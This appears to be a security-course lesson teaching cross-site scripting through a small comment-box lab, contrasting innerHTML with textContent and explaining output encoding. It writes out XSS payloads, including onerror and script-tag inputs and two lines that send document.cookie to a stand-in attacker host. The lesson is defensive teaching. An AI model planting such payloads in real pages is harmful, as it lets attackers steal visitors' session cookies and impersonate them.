# Lesson 6: Cross-Site Scripting (XSS)

Today we study the third and final interpreter in this module — not a database, not a
shell, but a **browser's HTML parser** — and the way this vulnerability breaks a pattern
you've relied on since Lesson 2: it doesn't attack the server that has the bug. It attacks
*every other user* who innocently views a page that server rendered.

## What you will learn

You'll build a comment box that renders exactly what a visitor typed, break it by making
a "comment" that runs JavaScript in another visitor's browser the moment they view the
page, and fix it the same structural way as Lessons 4 and 5 — by keeping user-supplied
text on the "data" side of a code/data boundary the browser enforces for you, if you ask
it to.

## What you need to know first

Lessons 1, 4, and 5 — this is the same trust-boundary failure, the third interpreter in a
row. If you understand why SQL injection and command injection work, XSS will look
familiar within the first code block. New today: this is the first vulnerability in this
course where the *victim* is a different person than the one with the vulnerable server.

---

## The problem

A web page is HTML — text with a specific grammar, the same way a SQL query or a shell
command is text with a specific grammar. `<p>` starts a paragraph. `<script>` starts
executable JavaScript. `<img onerror="...">` is an image tag carrying an **event
handler** — JavaScript that runs automatically when a specific thing happens, like the
image failing to load.

Websites constantly insert user-supplied text into pages — comments, usernames, search
results, reviews. If that text is inserted using an API that *parses* it as HTML, rather
than one that treats it as inert text, then anything an attacker types that looks like
HTML *becomes* HTML, exactly the way `--` became a SQL comment marker in Lesson 4. If
what they typed happens to include a working event handler, that handler runs as
JavaScript, in the browser, of **every visitor who views the page** — not the attacker's
own browser, and not the server. This is **Cross-Site Scripting**, almost always
abbreviated **XSS**: the attacker's script executes in a context — another user's
authenticated session, in their browser, with their cookies — that the attacker could
never reach directly.

## The lab: a comment box

**Disposable host.** A minimal comment renderer, in JavaScript, run under Node with a
library called `jsdom` that simulates a browser's DOM so the examples are runnable outside
an actual browser window. Everything shown here behaves identically in a real browser.

### Step 1 — rendering a comment with `innerHTML`

```javascript
function renderCommentUnsafe(commentText) {
  const commentsDiv = document.getElementById("comments");
  commentsDiv.innerHTML = "<p>" + commentText + "</p>";
}

renderCommentUnsafe("this is a great post!");
console.log(document.getElementById("comments").innerHTML);
```

**New construct: `innerHTML`.** Every HTML element in the DOM (Document Object Model — the
browser's in-memory tree representation of the page, one node per element) has an
`innerHTML` property. *Reading* it returns the HTML markup contained inside that element,
as a string. *Setting* it does something more powerful: the string you assign is handed to
the browser's HTML parser and turned into real elements, inserted into the page — the same
kind of parsing the browser does for the original page source.

Run it:

```
<p>this is a great post!</p>
```

**Walkthrough.** `renderCommentUnsafe` concatenates the literal text `"<p>"`, the comment,
and `"</p>"` into one string, and assigns it to `innerHTML`. The browser's parser sees
`<p>this is a great post!</p>` and creates a real paragraph element containing that text.
For an ordinary comment with no HTML-meaningful characters, this looks completely correct
— and it is, for this input. Notice the shape: build a string by concatenation, hand it to
an interpreter that parses code and data from the same channel. You've seen this shape
twice already.

**CS lens.** `innerHTML`'s setter is a **parser entry point** — it doesn't distinguish
between markup the page's author wrote and markup that ended up in the string by any other
means, including string concatenation with user input. To the parser, `<p>` followed by
whatever `commentText` contains is simply more HTML to parse, exactly as SQL's parser in
Lesson 4 didn't distinguish `check_login`'s literal query text from `username`'s
concatenated content.

**SE lens.** `renderCommentUnsafe` has the same unstated second responsibility you've now
seen three times: "safely turn arbitrary text into markup," a job `innerHTML` was never
designed to do for untrusted input, and that nothing in this function actually does.

### Step 2 — the payload

```javascript
renderCommentUnsafe('<img src="x" onerror="document.title=\'HACKED\'">');
console.log(document.getElementById("comments").innerHTML);

// In a real browser, the browser tries to load the image at src="x",
// fails (no such image exists), and automatically fires the "error" event
// -- which runs the onerror handler. jsdom, used here so this is runnable
// outside an actual browser, doesn't perform real network image loads, so
// we fire that same event by hand to show exactly what the browser would
// trigger on its own:
const image = document.querySelector("img");
image.dispatchEvent(new Event("error"));
console.log("document.title:", document.title);
```

Run it:

```
<p><img src="x" onerror="document.title='HACKED'"></p>
document.title: HACKED
```

**Walkthrough.** The comment text contained a full `<img>` tag with an `onerror`
attribute. Because `innerHTML` parses its input as HTML rather than displaying it as text,
the browser created a real `<img>` element and wired up its `onerror` attribute as a
genuine event handler — indistinguishable, to the browser, from an `onerror` attribute the
page's own developer had written by hand. `src="x"` deliberately points at an image that
doesn't exist, so the browser's normal image-loading process fails and fires the standard
`error` event — which the browser then delivers to the handler that was just parsed out of
the "comment." `document.title = 'HACKED'` is a single, harmless line chosen only to prove
execution happened. It could just as easily have been
`fetch('https://attacker.example/steal?cookie=' + document.cookie)` — reading this
visitor's own session cookie and sending it to a server the attacker controls.

**Security lens.** This is why XSS deserves its own category rather than being "just
another injection bug": the malicious script doesn't run on the vulnerable server at all —
it runs in the browser of **every other visitor** who views the comment, with that
visitor's own cookies, their own login session, their own permissions. If the vulnerable
page is one only the site's administrator ever views (say, a support dashboard listing
customer messages), the script runs with *the administrator's* session — an attacker who
could never reach an admin panel directly might reach it through this comment box instead.
This is why XSS breaks confidentiality (stealing session cookies), integrity (submitting
actions as the victim, without their knowledge — Lesson 15's CSRF is a close relative),
and, depending on the payload, can serve as a stepping stone toward much broader
compromise.

### Step 3 — the fix: `textContent` instead of `innerHTML`

```javascript
function renderCommentSafe(commentText) {
  const paragraph = document.createElement("p");
  paragraph.textContent = commentText;

  const commentsDiv = document.getElementById("comments");
  commentsDiv.innerHTML = "";
  commentsDiv.appendChild(paragraph);
}

renderCommentSafe('<img src="x" onerror="document.title=\'HACKED\'">');
console.log(document.getElementById("comments").innerHTML);
console.log("Is there an actual <img> element in the page?", document.querySelector("img") !== null);
```

**New constructs.** `document.createElement("p")` builds a new, empty paragraph element in
memory — not yet attached to the page. `.textContent`, unlike `.innerHTML`, does not parse
its assigned string as markup at all; it sets the element's contents to be **literally**
that text, character for character, with no interpretation. `.appendChild(paragraph)`
attaches the built element as the last child of `commentsDiv`, making it part of the
visible page.

Run it:

```
<p>&lt;img src="x" onerror="document.title='HACKED'"&gt;</p>
Is there an actual <img> element in the page? false
```

**Walkthrough.** The `<` and `>` characters from the comment are still visible in the
output — but notice the printed `innerHTML` shows `&lt;` and `&gt;` instead of literal `<`
and `>`. These are **HTML entities**: text representations of characters that would
otherwise be parsed as markup. `textContent` never parsed the comment as HTML at all; it
inserted it as plain text, and when the browser later needs to display `innerHTML` as a
string (for our `console.log`), it automatically **escapes** the literal `<` and `>` it's
holding back into `&lt;` and `&gt;` so that printing them doesn't accidentally look like
real markup either. The practical result: the visitor sees the literal text
`<img src="x" onerror="document.title='HACKED'">` printed on the page, exactly as they
typed it, as a harmless string — not as a real, running `<img>` element. `document.title`
never changes, because no `<img>` element, and therefore no `onerror` handler, was ever
created.

**CS lens.** This is, once again, Lessons 4 and 5's structural fix: **give untrusted data
a channel where it cannot be reinterpreted as the surrounding language's grammar.**
`textContent` is to `innerHTML` exactly what a parameterized query's placeholder is to
string-concatenated SQL, and what `subprocess.run`'s argument list is to a
shell-concatenated command string. In each case, the fix was never "detect and remove
dangerous input" — it was "use the API that keeps data out of the parser's path entirely."

**Security lens.** The general principle this instantiates is called **output encoding**
(here, specifically HTML-entity encoding): whenever untrusted data is placed into a
context that has its own grammar — HTML, a URL, a shell command, a SQL query — encode it
so that grammar-significant characters are represented in a form the parser reads as
literal data, not as instructions. Every context has its own encoding rules — a value
placed inside an HTML attribute needs different encoding than one placed inside a `<script>`
block or a URL query string — which is why the safest default is almost always "use the
framework or browser API built for this specific context" (`textContent`, a templating
engine's auto-escaping, a URL-building library) rather than hand-writing encoding logic.

---

## Incremental practice

Run `renderCommentSafe` against this short escalating sequence:

1. `renderCommentSafe("great post!")` — plain text, no special characters
2. `renderCommentSafe("5 < 10 and 10 > 5")` — HTML-meaningful characters with no
   malicious intent at all, a case real users hit by accident constantly
3. `renderCommentSafe('<b>bold</b>')` — an attempt at "helpful" formatting markup
4. `renderCommentSafe('<img src="x" onerror="alert(1)">')` — the Step 2 payload
5. `renderCommentSafe('"><script>alert(1)</script>')` — a payload shaped to try to
   escape out of an HTML attribute context, not just a text context

All five render as inert, literal text with `textContent`. Case 2 matters as much as case
4: a correct fix doesn't just stop attacks, it stops *legitimate* input from being
misinterpreted — a comment about "less than" and "greater than" signs shouldn't have parts
of it silently vanish because a naive fix tried to strip `<` and `>` rather than encoding
them.

---

## Connect the pieces

Lessons 4, 5, and 6 are one lesson told three times, in three interpreters: a SQL engine,
a shell, and an HTML parser. Every fix has the identical shape — a parameterized query, an
argument list instead of a command string, `textContent` instead of `innerHTML` — because
every vulnerability had the identical shape: untrusted data sharing a channel with trusted
code. If you can now predict, before I show you, what a fourth injection vulnerability's
fix will look like (it will: separate the data from the interpreter's grammar, using
whichever API keeps that separation structural rather than optional), Module B has done
its job.

## What breaks without this

Take Step 1's `renderCommentUnsafe` and imagine the comment page belongs to a logged-in
users-only forum, where session cookies aren't protected by the `HttpOnly` flag you'll
meet properly in Lesson 14:

```javascript
renderCommentUnsafe(
  '<img src="x" onerror="fetch(\'https://attacker.example/log?c=\' + document.cookie)">'
);
```

Every user who views this comment — not just the one who posted it — has their session
cookie sent to a server the attacker controls, silently, with no visible sign anything
happened. The attacker can then use that stolen cookie to impersonate the victim without
ever knowing their password, bypassing authentication entirely — the same devastating
outcome as Lesson 4's SQL injection payload, reached through a completely different
interpreter.

## Recognition

```
Today: Cross-Site Scripting / XSS (untrusted text parsed as HTML/JavaScript grammar)

Also recognized in: every templating engine's auto-escaping feature (Jinja2, React's
JSX, Vue's templates all HTML-encode interpolated values by default specifically to
prevent this), Content Security Policy headers (a browser-enforced allow-list for
which scripts are permitted to run on a page at all, a defense-in-depth layer on
top of output encoding), the DOM-based XSS variant (where the vulnerable
`innerHTML` assignment happens entirely in client-side JavaScript, with no server
involved at all), and markdown renderers that must decide whether to allow raw
HTML in user-submitted markdown (most disable it by default for exactly this
reason).
```

## Definition of done

- [ ] You ran Steps 1 through 3 and reproduced the outputs shown, including
      `document.title` actually changing to `"HACKED"` in Step 2
- [ ] You ran the five-case incremental practice sequence and can explain why case 2
      (ordinary `<` and `>` in harmless text) is just as important a test as case 4
- [ ] You can explain, in one sentence, why XSS is unusual among the vulnerabilities in
      this course in terms of *who* the victim is
- [ ] You can name the general principle (`output encoding`) and explain why it needs to
      differ depending on where the untrusted data is being inserted (HTML text vs. an
      HTML attribute vs. a URL)
- [ ] `git add .` and `git commit -m "Lesson 6: XSS — innerHTML vs textContent, and why
      the victim isn't the server"` in your `security-labs/` folder

**Next:** Lesson 7 opens Module C — Cryptography — starting with Hashing vs. Encryption,
where you'll build both from scratch-adjacent primitives and learn precisely why "the
password is encrypted in our database" is a sentence that should worry you.
